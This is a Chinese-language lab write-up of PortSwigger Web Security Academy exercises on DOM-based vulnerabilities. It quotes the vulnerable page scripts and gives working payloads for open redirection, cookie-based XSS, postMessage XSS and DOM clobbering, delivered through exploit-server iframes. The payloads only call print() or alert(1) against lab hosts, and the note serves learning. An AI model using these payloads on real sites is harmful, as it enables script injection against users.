---
title: DOM-based vulnerabilities
description: DOM-based vulnerabilities
last_update:
  date: "2025-08-25T08:00:00+08:00"
---

## 資源

這邊整理了可能會有 DOM-based vulnerabilities 的情境

- https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
- https://portswigger.net/web-security/dom-based#common-sources
- https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities
- https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities
- https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities
- https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities

## Lab: DOM-based open redirection

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection |
| Lab       | https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection                         |

在評論頁面 `/post?postId=6` 下方的 Back to Blog，有以下程式碼

```js
returnUrl = /url=(https?:\/\/.+)/.exec(location);
location.href = returnUrl ? returnUrl[1] : "/";
```

構造 `/post?postId=6&url=https://exploit-0aeb00cd0416304980e8c6bc01cd00d9.exploit-server.net`，並且點擊 Back to Blog，即可完成

## Lab: DOM-based cookie manipulation

<!-- todo-yus 可重打 -->

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-dom-based-cookie-manipulation |
| Lab       | https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation           |

首先用 `document.cookie` 去搜尋，找到在商品頁 `/product?productId=1` 有以下 js

```js
document.cookie =
  "lastViewedProduct=" + window.location + "; SameSite=None; Secure";
```

並且重整後，會在右上角看到

```html
<a
  href="https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1"
  >Last viewed product</a
>
```

構造以下 querystring

- decode：`?productId=1&xss=' tabindex=0 autofocus onfocus='print()`
- encode：`?productId=1&xss='%20tabindex=0%20autofocus%20onfocus=%27print()`

在 exploit-server 構造以下 html

```html
<html>
  <head></head>
  <body>
    <iframe
      src="https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1&xss='%20tabindex=0%20autofocus%20onfocus=%27print()"
    ></iframe>
  </body>
</html>
```

View exploit => 看到 `Blocked autofocusing on a <a> element in a cross-origin subframe.`，看來這題沒這麼好解...

改成注入新的 DOM 試試看

- decode： `?productId=1&xss='></a><img src='x' onerror='print()'/><a href='`
- encode： `?productId=1&xss=%27></a><img%20src=%27x%27%20onerror=%27print()%27/><a%20href=%27`

由於第一次進入商品頁會寫入 `document.cookie`，第二次進入商品頁才會觸發 XSS，所以我們需要先用 `<iframe>` 模擬第一次的載入，在 exploit-server 構造以下 html

```html
<html>
  <head></head>
  <body>
    <script>
      function redirectToVulnPage() {
        location.href =
          "https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1&xss=%27></a><img%20src=%27x%27%20onerror=%27print()%27/><a%20href=%27";
      }
    </script>
    <iframe
      src="https://0a2200800321237180a52b3d00ca004a.web-security-academy.net/product?productId=1&xss=%27></a><img%20src=%27x%27%20onerror=%27print()%27/><a%20href=%27"
      onload="redirectToVulnPage()"
    ></iframe>
  </body>
</html>
```

這題我覺得蠻有趣，需要結合 [Cross-site scripting](./cross-site-scripting.md) 的知識

## Lab: DOM XSS using web messages

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/controlling-the-web-message-source                                |
| Lab       | https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages |

觀察首頁有以下 js

```html
<script>
  window.addEventListener("message", function (e) {
    document.getElementById("ads").innerHTML = e.data;
  });
</script>
```

在 exploit-server 構造

```html
<iframe
  src="https://0aa700b70484ba8f816a210500d10029.web-security-academy.net/"
  onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')"
></iframe>
```

## Lab: DOM XSS using web messages and a JavaScript URL

| Dimension | Description                                                                                                                           |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/controlling-the-web-message-source                                                     |
| Lab       | https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url |

觀察首頁有以下 js

```html
<script>
  window.addEventListener(
    "message",
    function (e) {
      var url = e.data;
      if (url.indexOf("http:") > -1 || url.indexOf("https:") > -1) {
        location.href = url;
      }
    },
    false,
  );
</script>
```

在 exploit-server 構造

```html
<iframe
  src="https://0a2700bc049ab02982e429c8009c0064.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print();const a = \'https://example.com\';','*')"
></iframe>
```

## Lab: DOM XSS using web messages and `JSON.parse`

| Dimension | Description                                                                                                                     |
| --------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification                           |
| Lab       | https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse |

觀察首頁有以下 js

```html
<script>
  window.addEventListener(
    "message",
    function (e) {
      var iframe = document.createElement("iframe"),
        ACMEplayer = { element: iframe },
        d;
      document.body.appendChild(iframe);
      try {
        d = JSON.parse(e.data);
      } catch (e) {
        return;
      }
      switch (d.type) {
        case "page-load":
          ACMEplayer.element.scrollIntoView();
          break;
        case "load-channel":
          ACMEplayer.element.src = d.url;
          break;
        case "player-height-changed":
          ACMEplayer.element.style.width = d.width + "px";
          ACMEplayer.element.style.height = d.height + "px";
          break;
      }
    },
    false,
  );
</script>
```

在 exploit-server 構造

```html
<script>
  const evilPayload = { type: "load-channel", url: "javascript:print()" };
</script>
<iframe
  src="https://0a0300520390853e80784465006e00f0.web-security-academy.net/"
  onload="this.contentWindow.postMessage(JSON.stringify(evilPayload),'*')"
></iframe>
```

## Lab: Exploiting DOM clobbering to enable XSS

<!-- todo-yus 可重打 -->

| Dimension | Description                                                                                                 |
| --------- | ----------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities |
| Lab       | https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering         |

觀察 Comment 頁面有 `loadCommentsWithDomClobbering.js`

```js
function loadComments(postCommentPath) {
  let xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let comments = JSON.parse(this.responseText);
      displayComments(comments);
    }
  };
  xhr.open("GET", postCommentPath + window.location.search);
  xhr.send();

  function escapeHTML(data) {
    return data.replace(/[<>'"]/g, function (c) {
      return "&#" + c.charCodeAt(0) + ";";
    });
  }

  function displayComments(comments) {
    let userComments = document.getElementById("user-comments");

    for (let i = 0; i < comments.length; ++i) {
      comment = comments[i];
      let commentSection = document.createElement("section");
      commentSection.setAttribute("class", "comment");

      let firstPElement = document.createElement("p");

      let defaultAvatar = window.defaultAvatar || {
        avatar: "/resources/images/avatarDefault.svg",
      };
      let avatarImgHTML =
        '<img class="avatar" src="' +
        (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) +
        '">';

      let divImgContainer = document.createElement("div");
      divImgContainer.innerHTML = avatarImgHTML;

      if (comment.author) {
        if (comment.website) {
          let websiteElement = document.createElement("a");
          websiteElement.setAttribute("id", "author");
          websiteElement.setAttribute("href", comment.website);
          firstPElement.appendChild(websiteElement);
        }

        let newInnerHtml =
          firstPElement.innerHTML + DOMPurify.sanitize(comment.author);
        firstPElement.innerHTML = newInnerHtml;
      }

      if (comment.date) {
        let dateObj = new Date(comment.date);
        let month = "" + (dateObj.getMonth() + 1);
        let day = "" + dateObj.getDate();
        let year = dateObj.getFullYear();

        if (month.length < 2) month = "0" + month;
        if (day.length < 2) day = "0" + day;

        dateStr = [day, month, year].join("-");

        let newInnerHtml = firstPElement.innerHTML + " | " + dateStr;
        firstPElement.innerHTML = newInnerHtml;
      }

      firstPElement.appendChild(divImgContainer);

      commentSection.appendChild(firstPElement);

      if (comment.body) {
        let commentBodyPElement = document.createElement("p");
        commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);

        commentSection.appendChild(commentBodyPElement);
      }
      commentSection.appendChild(document.createElement("p"));

      userComments.appendChild(commentSection);
    }
  }
}
```

主要我猜注入點應該是

```js
let defaultAvatar = window.defaultAvatar || {
  avatar: "/resources/images/avatarDefault.svg",
};
let avatarImgHTML =
  '<img class="avatar" src="' +
  (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) +
  '">';
```

在 Comment 輸入

```html
<a id="defaultAvatar"></a>
<a id="defaultAvatar" name="avatar" href='mailto:" onerror="alert(1)'></a>
```

第二次輸入評論時，就會載入 clobbering 過後的 `defaultAvatar.avatar`，但竟然沒有 Solved Lab，我覺得判斷機制有問題XD

## Lab: Clobbering DOM attributes to bypass HTML filters

| Dimension | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities        |
| Lab       | https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters |

觀察 Comment 頁面有 `loadCommentsWithHtmlJanitor.js`

```js
function loadComments(postCommentPath) {
  let xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let comments = JSON.parse(this.responseText);
      displayComments(comments);
    }
  };
  xhr.open("GET", postCommentPath + window.location.search);
  xhr.send();
  let janitor = new HTMLJanitor({
    tags: {
      input: { name: true, type: true, value: true },
      form: { id: true },
      i: {},
      b: {},
      p: {},
    },
  });

  function displayComments(comments) {
    let userComments = document.getElementById("user-comments");

    for (let i = 0; i < comments.length; ++i) {
      comment = comments[i];
      let commentSection = document.createElement("section");
      commentSection.setAttribute("class", "comment");

      let firstPElement = document.createElement("p");

      let avatarImgElement = document.createElement("img");
      avatarImgElement.setAttribute("class", "avatar");
      avatarImgElement.setAttribute(
        "src",
        comment.avatar ? comment.avatar : "/resources/images/avatarDefault.svg",
      );

      if (comment.author) {
        if (comment.website) {
          let websiteElement = document.createElement("a");
          websiteElement.setAttribute("id", "author");
          websiteElement.setAttribute("href", comment.website);
          firstPElement.appendChild(websiteElement);
        }

        let newInnerHtml =
          firstPElement.innerHTML + janitor.clean(comment.author);
        firstPElement.innerHTML = newInnerHtml;
      }

      if (comment.date) {
        let dateObj = new Date(comment.date);
        let month = "" + (dateObj.getMonth() + 1);
        let day = "" + dateObj.getDate();
        let year = dateObj.getFullYear();

        if (month.length < 2) month = "0" + month;
        if (day.length < 2) day = "0" + day;

        dateStr = [day, month, year].join("-");

        let newInnerHtml = firstPElement.innerHTML + " | " + dateStr;
        firstPElement.innerHTML = newInnerHtml;
      }

      firstPElement.appendChild(avatarImgElement);

      commentSection.appendChild(firstPElement);

      if (comment.body) {
        let commentBodyPElement = document.createElement("p");
        commentBodyPElement.innerHTML = janitor.clean(comment.body);

        commentSection.appendChild(commentBodyPElement);
      }
      commentSection.appendChild(document.createElement("p"));

      userComments.appendChild(commentSection);
    }
  }
}
```

意外的有點簡單，先到 Comment 這邊留言

```html
<form autofocus tabindex="0" onfocus="print()">
  <input id="attributes" />Click me
</form>
```

之後在 exploit-server 構造

```
HTTP/1.1 301 Moved Permanently
Location: https://0a6e008703dc6333801b71c8002b006b.web-security-academy.net/post?postId=7
```

這題我覺得會用到 [Lab: Reflected XSS into HTML context with all tags blocked except custom ones](./cross-site-scripting.md#lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones) 的概念

總之就是 `autofocus tabindex=0 onfocus=print()` 這套組合拳，載入頁面就直接觸發

## 小結

建議先把 [XSS](https://portswigger.net/web-security/cross-site-scripting) Lab 解完，再來解這個 Lab，會順暢很多～

## 參考資料

- https://portswigger.net/web-security/dom-based
